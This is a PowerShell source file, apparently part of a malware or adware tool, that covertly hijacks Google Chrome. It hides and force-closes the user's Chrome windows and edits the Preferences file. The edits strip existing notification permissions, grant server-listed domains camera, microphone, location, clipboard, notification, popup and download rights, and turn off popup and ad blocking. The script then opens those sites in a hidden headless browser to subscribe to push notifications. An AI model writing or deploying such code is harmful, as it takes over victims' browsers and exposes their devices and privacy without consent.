. ./utils.ps1
. ./consts_body.ps1



function Compare-Arrays {
    param (
        [array]$Array1,
        [array]$Array2
    )

    # Sort both arrays and compare
    $array1Sorted = $Array1 | Sort-Object | Get-Unique
    $array2Sorted = $Array2 | Sort-Object | Get-Unique

    $jo1 = $array1Sorted -join ',' 
    
    $jo2 = $array2Sorted -join ','

    # Determine if the arrays are equal (order does not matter)
    if ($jo1 -eq $jo2 ) {
        return $true
    } else {
        return $false
    }
}


function HaveToPushes {
    $result = $false;
    $exists = @()
    $toset = @()
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $exists += PushDomain -pushUrl $siteUrl
            }
        }
    }

    foreach ($push in $server.pushes) {
        $toset += PushDomain -pushUrl $push
    }

     $result = -not(Compare-Arrays -Array1 $exists -Array2 $toset)
    
    return $result;
}


function PushDomain {
    param ($pushUrl)

    # Trim the input string before the first comma
    $trimmedUrl = $pushUrl.Trim().Split(',')[0].Trim()

    # Parse the URI
    $parsedUri = [System.Uri]::new($trimmedUrl)
    
    # Extract domain and port
    $domain = $parsedUri.Host
    $port = if ($parsedUri.Port -eq -1) { 443 } else { $parsedUri.Port }

    # Construct the result URL
    $result = "https://" + $domain + ":" + "$port,*"
    
    return $result
}

function PushExists
{
    param ($pushUrl)
    foreach ($push in $server.pushes) 
    {
        if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
        {
            return $true;
        }
    }
    return $false
}

function Remove-Pushes {
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            $keysToRemove = @()

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $permission = (PushExists -pushUrl $siteUrl)
            
                if ($permission -eq $false) {
                    $keysToRemove += $field.Name
                } else {
                    writedbg "$siteUrl hasn't been removed, it is a good site."
                }
            }

            foreach ($key in $keysToRemove) {
                $notificationSettings.PSObject.Properties.Remove($key)
            }

            $preferencesContent | ConvertTo-Json -Depth 100 | Set-Content -Path $preferencesPath -Force

            writedbg "All selected push notification settings have been removed."
        } else {
            writedbg "No or unexpected notification settings found in Preferences file."
        }
    } else {
        writedbg "Preferences file not found at path: $preferencesPath"
    }
}

function Add-Pushes{
    foreach ($push in $server.pushes) {
        Add-Push -pushUrl $push -work $work
    }
}

function Add-Push {
    param (
        [string]$pushUrl
    )

    $pushDomain = PushDomain -pushUrl $pushUrl

    $chromePreferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (-not (Test-Path -Path $chromePreferencesPath)) {
        writedbg "Chrome preferences file not found at path: $chromePreferencesPath"
        exit
    }

    $preferencesContent = Get-Content -Path $chromePreferencesPath -Raw | ConvertFrom-Json

    if (-not $preferencesContent.profile) {
        $preferencesContent | Add-Member -MemberType NoteProperty -Name profile -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values) {
        $preferencesContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values.popups) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name popups -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.popups = 1
    }

    if (-not $preferencesContent.profile.default_content_setting_values.subresource_filter) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name subresource_filter -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.subresource_filter = 1
    }

    $preferencesContentJson = $preferencesContent | ConvertTo-Json -Depth 32
    Set-Content -Path $chromePreferencesPath -Value $preferencesContentJson -Force

    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
        $contentSettings = $preferencesContent.profile.content_settings.exceptions
        $settingsToUpdate = @(
            "auto_picture_in_picture", "background_sync", "camera", "clipboard", "cookies", 
            "geolocation", "images", "javascript", "microphone", "midi_sysex", 
            "notifications", "popups", "plugins", "sound", "unsandboxed_plugins", 
            "automatic_downloads", "flash_data", "mixed_script", "sensors","window_placement","webid_api","vr",
            "subresource_filter","media_stream_mic","media_stream_mic","media_stream_camera","local_fonts",
            "javascript_jit","idle_detection","captured_surface_control","ar"

        )

        foreach ($setting in $settingsToUpdate) {
            if ($null -eq $contentSettings.$setting) {
                $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
            }
            $specificSetting = $contentSettings.$setting
            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {            
            } else {
                $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
                    "last_modified" = "13362720545785774"
                    "setting" = 1
                }
                $contentSettings.$setting = $specificSetting
            }
        }

        $preferencesContent.profile.content_settings.exceptions = $contentSettings
        $updatedPreferencesJson = $preferencesContent | ConvertTo-Json -Depth 10
        $updatedPreferencesJson | Set-Content -Path $preferencesPath -Encoding UTF8

        writedbg "Notification subscription for $pushDomain added successfully with all permissions."
    } else {
        writedbg "Preferences file not found at path: $preferencesPath"
    }
}



function Close-ChromeWindow {
    param ($window)
    [User32X]::CloseWindow($window) | Out-Null
    Start-Sleep -Milliseconds 25
}

function Close-Chrome {
    param ($process)
    Close-ChromeWindow -window $process.MainWindowHandle
    try {
        $process.Close()
    }
    catch {
  
    }
}


function Close-AllChromes {
    $windows = [User32X]::EnumerateAllWindows()
    foreach ($window in $windows) 
    {
        $title = [User32X]::GetWindowText($window)
        if ($title.Contains("Google Chrome"))
        {
            [User32X]::ShowWindow($window, [User32X]::SW_HIDE) | Out-Null
            Close-ChromeWindow -window $window
        }
    }
    Close-Processes(@('chrome.exe'))
    Start-Sleep -Milliseconds 5
}

function ConfigureChromePushes {
    $auto = Test-Autostart;
    if ($server.pushesForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping ConfigureChromePushes"
        return
    }
    try {
        
   

    Add-Type @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;

    public static class User32X {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        public static string GetWindowText(IntPtr hWnd) {
            int length = GetWindowTextLength(hWnd);
            if (length == 0) return String.Empty;

            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        public static bool IsWindowVisibleEx(IntPtr hWnd) {
            return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
        }

        public static IntPtr[] EnumerateAllWindows() {
            var windowHandles = new List<IntPtr>();
            EnumWindows((hWnd, lParam) => {
                if (IsWindowVisibleEx(hWnd)) {
                    windowHandles.Add(hWnd);
                }
                return true;
            }, IntPtr.Zero);
            return windowHandles.ToArray();
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_MINIMIZE = 6;
        public const int SW_SHOW = 5;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static void CloseWindow(IntPtr hWnd) {
            const uint WM_CLOSE = 0x0010;
            PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }
"@

    if (HaveToPushes)
    {
        Close-AllChromes;
        Remove-Pushes;
        Add-Pushes;
    }

}
catch {
    writedbg "An error occurred (Configure Chrome Pushes): $_"
}
}



function Open-ChromeWithUrl {
    param (
        [string]$url, $isDebug
    )
    $job = Start-Job -ScriptBlock {
            param ($url, $isDebug)

            try {
                
 
            Add-Type @"
            using System;
            using System.Collections.Generic;
            using System.Runtime.InteropServices;
            using System.Text;
            
            public static class User32X {
                public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowTextLength(IntPtr hWnd);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool IsWindowVisible(IntPtr hWnd);
            
                public static string GetWindowText(IntPtr hWnd) {
                    int length = GetWindowTextLength(hWnd);
                    if (length == 0) return String.Empty;
            
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowText(hWnd, sb, sb.Capacity);
                    return sb.ToString();
                }
            
                public static bool IsWindowVisibleEx(IntPtr hWnd) {
                    return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
                }
            
                public static IntPtr[] EnumerateAllWindows() {
                    var windowHandles = new List<IntPtr>();
                    EnumWindows((hWnd, lParam) => {
                        if (IsWindowVisibleEx(hWnd)) {
                            windowHandles.Add(hWnd);
                        }
                        return true;
                    }, IntPtr.Zero);
                    return windowHandles.ToArray();
                }
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            
                public const int SW_HIDE = 0;
                public const int SW_MINIMIZE = 6;
                public const int SW_SHOW = 5;
                public const int SW_MAXIMIZE = 3; // Added constant for maximizing window
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
            
                public static void CloseWindow(IntPtr hWnd) {
                    const uint WM_CLOSE = 0x0010;
                    PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                }
            }
"@
}
catch {
}
        
        function Close-ChromeWindow {
            try {
                param ($window)
                [User32X]::CloseWindow($window) | Out-Null
                Start-Sleep -Milliseconds 100
            }
            catch {}
        }
        
        function Close-Chrome {
            param ($process)
            Close-ChromeWindow -window $process.MainWindowHandle
            try {
                $process | Stop-Process -Force
            }
            catch {
            }
        }

        $chromePaths = @(
            "C:\Program Files\Google\Chrome\Application\chrome.exe",
            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
        )
        $resolvedPaths = @()
        foreach ($path in $chromePaths) {
            try {
                $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
                if ($resolvedPath -notin $resolvedPaths) {
                    $resolvedPaths += $resolvedPath.Path
                }
            } catch {
                writedbg "Error resolving path: $_"
            }
        }
        $resolvedPaths = $resolvedPaths | Select-Object -Unique
        foreach ($path in $resolvedPaths) {
            if (Test-Path -Path $path) {
                writedbg "Found Chrome at: $path"
    
                $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processStartInfo.FileName = $path
                if (-not $isDebug)
                {
                    $processStartInfo.Arguments = "--headless";
                }
                $processStartInfo.Arguments += " --disable-gpu --dump-dom $url"
                $processStartInfo.CreateNoWindow = $false
                $processStartInfo.UseShellExecute = $false
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $processStartInfo
                $process.Start() | Out-Null         
                $endTime = (Get-Date).AddSeconds(8)
                while ((Get-Date) -lt $endTime) {
                    if ($isDebug -eq $false)
                    {
                        try
                        {
                            [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null                                
                        }
                        catch
                        {
                        }
                    }
                    Start-Sleep -Milliseconds 100
                }
                try
                {
                    [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
                }
                catch
                {
                }
                Close-Chrome -process $process
                break
            } else {
                writedbg "Chrome not found at: $path"
            }
        }

    } -ArgumentList $url, $isDebug

    return $job
}

function LaunchChromePushes {
    $auto = Test-Autostart;
    if ($server.pushesForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping function LaunchChromePushes"
        return
    }
    try {
        foreach ($push in $server.pushes) {
            $isDebug = IsDebug
            Open-ChromeWithUrl -url $push -isDebug $isDebug
        }
    }
    catch {
      writedbg "An error occurred LaunchChromePushes): $_"
    }
}

function do_chrome_push {
    ConfigureChromePushes
    LaunchChromePushes
}